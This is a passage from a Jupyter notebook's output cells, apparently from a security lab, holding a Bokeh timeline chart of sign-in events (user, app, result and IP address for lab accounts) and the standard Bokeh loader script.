WCSS-Client\"],\"shape\":[86],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"caroline@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"seb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"caroline@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[86],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Failed\",\"Failed\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[86],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"24.13.212.221\",\"24.16.133.227\",\"24.16.133.227\",\"24.13.212.221\",\"73.226.223.252\",\"73.226.223.252\",\"24.16.133.227\",\"24.16.133.227\",\"73.35.204.105\",\"136.55.145.135\",\"136.55.145.135\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"73.226.223.252\",\"136.55.145.135\",\"73.226.223.252\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"136.55.145.135\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[86],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"upPzS/GKeUK60z4U8op5QrrTPhTyinlCupPzS/GKeUK6M6EX7Yp5QrozoRftinlCuuPupOWKeUK64+6k5Yp5Qrpj7iPninlCuhNu4NqKeUK6E27g2op5Qrpj7iPninlCunNtIueKeUK64ygk54p5QrqTSBftinlCutPR8eKKeUK6k0gX7Yp5QrpjIcvKinlCunNtIueKeUK6cyok54p5Qrrz9SPninlCupN0y9+KeUK6k3TL34p5QrpTPWrninlCuuMoJOeKeUK6Uz1q54p5QrpzKiTninlCutNFzN+KeUK6Y8rL34p5QrqzjHbhinlCuuMSkOKKeUK6g6GK4op5QrrTj4riinlCumPXiuKKeUK6Ax6L4op5Qrpz1rPfinlCunPWs9+KeUK6gxHH34p5QrpTgsrfinlCugO+yt+KeUK6A77K34p5QrpTgsrfinlCunMNy9+KeUK6cw3L34p5QrqDEcffinlCumPKy9+KeUK6M5iL4op5QrrT8Y7iinlCujOYi+KKeUK6g6GK4op5QrrjEpDiinlCusMViuKKeUK6Y9eK4op5QrrTj4riinlCujNZiuKKeUK686CK4op5QrozWYriinlCutPxjuKKeUK686CK4op5QroDHoviinlCutPR8eKKeUK6gyGS9op5QrqDIZL2inlCugN5y8qKeUK6w3TLyop5QrpjIcvKinlCurNay8qKeUK6A3nLyop5QrqT5cjKinlCupPlyMqKeUK6s1rLyop5QrqzjHbhinlCusMViuKKeUK6E/tY9Yp5QroT+1j1inlCuhNSmPaKeUK6s7Zdy4p5Qrqztl3LinlCusN0y8qKeUK6c+Ni0Ip5QrpT8WLQinlCurMIYNCKeUK6Q4ti0Ip5Qrpz42LQinlCulPxYtCKeUK6Q4ti0Ip5Qg==\"},\"shape\":[86],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"},\"shape\":[86],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2364\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2365\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2360\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2361\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2362\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p2226\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p2182\",\"attributes\":{\"renderers\":\"auto\",\"tooltips\":[[\"AppDisplayName\",\"@AppDisplayName\"],[\"UserPrincipalName\",\"@UserPrincipalName\"],[\"Result\",\"@Result\"],[\"IPAddress\",\"@IPAddress\"],[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"]],\"formatters\":{\"type\":\"map\",\"entries\":[[\"@TimeGenerated\",\"datetime\"]]}}},{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p2255\",\"attributes\":{\"dimensions\":\"width\",\"renderers\":\"auto\"}},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p2256\",\"attributes\":{\"dimensions\":\"both\",\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2257\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5,\"level\":\"overlay\",\"visible\":false,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"top_units\":\"canvas\",\"bottom_units\":\"canvas\",\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2263\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2262\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p2264\"},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p2265\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p2266\",\"attributes\":{\"dimensions\":\"width\"}}]}},\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p2250\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p2251\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p2252\"},\"major_label_overrides\":{\"type\":\"map\",\"entries\":[[0,\"unnamed series\"]]},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2253\"}}}],\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2231\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2232\",\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2233\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2234\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2235\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2236\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2237\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2238\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2239\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2240\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2241\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2242\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2243\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2244\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2356\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"axis_label\":\"Event Time\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2248\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2249\",\"attributes\":{\"axis\":{\"id\":\"p2231\"},\"minor_grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.3}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2254\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p2250\"},\"grid_line_color\":null}}],\"min_border_left\":50}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2301\",\"attributes\":{\"width\":900,\"height\":120,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2311\",\"attributes\":{\"start\":1755236755796.833,\"end\":1755296475685.633}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p2303\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2312\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2313\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2304\",\"attributes\":{\"text\":\"Range Selector\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2341\",\"attributes\":{\"data_source\":{\"id\":\"p2179\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2342\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2343\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2338\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2339\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2340\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"navy\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p2310\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"RangeTool\",\"id\":\"p2344\",\"attributes\":{\"x_range\":{\"id\":\"p2227\"},\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2349\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":0.5,\"line_dash\":[2,2],\"fill_color\":\"navy\",\"fill_alpha\":0.2,\"level\":\"overlay\",\"propagate_hover\":true,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2345\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"left\"}},\"right_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2346\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"right\"}},\"top_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2347\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"top\"}},\"bottom_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2348\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"bottom\"}},\"editable\":true,\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2355\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2354\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}}]}},\"toolbar_location\":null,\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2314\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2315\",\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2316\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2317\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2318\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2319\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2320\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2321\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2322\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2323\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2324\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2325\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2326\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2327\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2334\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2331\"}}},{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2333\",\"attributes\":{\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\",\"align\":\"right\"}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2332\",\"attributes\":{\"axis\":{\"id\":\"p2314\"}}}]}}]}}]}};\n  const render_items = [{\"docid\":\"68f7be1f-55f7-4e17-a575-6f9844aa6b68\",\"roots\":{\"p2366\":\"b15b4e2f-9f48-4a3e-bfdf-381b3285df98\"},\"root_ids\":[\"p2366\"]}];\n  void root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "p2366"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "    <style>\n",
       "        .bk-notebook-logo {\n",
       "            display: block;\n",
       "            width: 20px;\n",
       "            height: 20px;\n",
       "            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAOkSURBVDiNjZRtaJVlGMd/1/08zzln5zjP1LWcU9N0NkN8m2CYjpgQYQXqSs0I84OLIC0hkEKoPtiH3gmKoiJDU7QpLgoLjLIQCpEsNJ1vqUOdO7ppbuec5+V+rj4ctwzd8IIbbi6u+8f1539dt3A78eXC7QizUF7gyV1fD1Yqg4JWz84yffhm0qkFqBogB9rM8tZdtwVsPUhWhGcFJngGeWrPzHm5oaMmkfEg1usvLFyc8jLRqDOMru7AyC8saQr7GG7f5fvDeH7Ej8CM66nIF+8yngt6HWaKh7k49Soy9nXurCi1o3qUbS3zWfrYeQDTB/Qj6kX6Ybhw4B+bOYoLKCC9H3Nu/leUTZ1JdRWkkn2ldcCamzrcf47KKXdAJllSlxAOkRgyHsGC/zRday5Qld9DyoM4/q/rUoy/CXh3jzOu3bHUVZeU+DEn8FInkPBFlu3+nW3Nw0mk6vCDiWg8CeJaxEwuHS3+z5RgY+YBR6V1Z1nxSOfoaPa4LASWxxdNp+VWTk7+4vzaou8v8PN+xo+KY2xsw6une2frhw05CTYOmQvsEhjhWjn0bmXPjpE1+kplmmkP3suftwTubK9Vq22qKmrBhpY4jvd5afdRA3wGjFAgcnTK2s4hY0/GPNIb0nErGMCRxWOOX64Z8RAC4oCXdklmEvcL8o0BfkNK4lUg9HTl+oPlQxdNo3Mg4Nv175e/1LDGzZen30MEjRUtmXSfiTVu1kK8W4txyV6BMKlbgk3lMwYCiusNy9fVfvvwMxv8Ynl6vxoByANLTWplvuj/nF9m2+PDtt1eiHPBr1oIfhCChQMBw6Aw0UulqTKZdfVvfG7VcfIqLG9bcldL/+pdWTLxLUy8Qq38heUIjh4XlzZxzQm19lLFlr8vdQ97rjZVOLf8nclzckbcD4wxXMidpX30sFd37Fv/GtwwhzhxGVAprjbg0gCAEeIgwCZyTV2Z1REEW8O4py0wsjeloKoMr6iCY6dP92H6Vw/oTyICIthibxjm/DfN9lVz8IqtqKYLUXfoKVMVQVVJOElGjrnnUt9T9wbgp8AyYKaGlqingHZU/uG2NTZSVqwHQTWkx9hxjkpWDaCg6Ckj5qebgBVbT3V3NNXMSiWSDdGV3hrtzla7J+duwPOToIg42ChPQOQjspnSlp1V+Gjdged7+8UN5CRAV7a5EdFNwCjEaBR27b3W890TE7g24NAP/mMDXRWrGoFPQI9ls/MWO2dWFAar/xcOIImbbpA3zgAAAABJRU5ErkJggg==);\n",
       "        }\n",
       "    </style>\n",
       "    <div>\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-notebook-logo\"></a>\n",
       "        <span id=\"effb5a83-498c-4f56-8da9-9d7550bdf0c8\">Loading BokehJS ...</span>\n",
       "    </div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "'use strict';\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\nconst JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    function drop(id) {\n      const view = Bokeh.index.get_by_id(id)\n      if (view != null) {\n        view.model.document.clear()\n        Bokeh.index.delete(view)\n      }\n    }\n\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = 